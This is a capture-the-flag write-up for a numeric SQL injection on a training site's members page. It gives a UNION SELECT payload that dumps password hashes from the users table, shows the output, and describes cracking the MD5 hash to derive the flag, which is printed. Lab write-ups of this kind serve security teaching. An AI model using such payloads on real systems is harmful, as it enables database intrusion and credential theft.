# SQL Numeric Injection - Members

## Flag

10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Description

Vulnerable SQL.

## URL

http://192.168.x.y/?page=member

## Steps To Reproduce

Using this payload:
`1 OR 1=1 UNION ALL SELECT Commentaire, countersign FROM users--`

We get, for the last result :

```
ID: 1 OR 1=1 UNION ALL SELECT Commentaire, countersign FROM users--
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

Using crackstation, we crack the md5 (in the surname field) to get : FortyTwo, lowercase it : fortytwo, then hash it with sha256 to get our flag.

## Why is it dangerous ?

See [SQL Numeric Injection - Gallery](https://github.com/jeremie-gauthier/Darkly/blob/master/SQLNumericInjection_Gallery.md#why-is-it-dangerous-)

## Possible fixes

See [SQL Numeric Injection - Gallery](https://github.com/jeremie-gauthier/Darkly/blob/master/SQLNumericInjection_Gallery.md#possible-fixes)

## Resources

There is no additional resource for this issue.
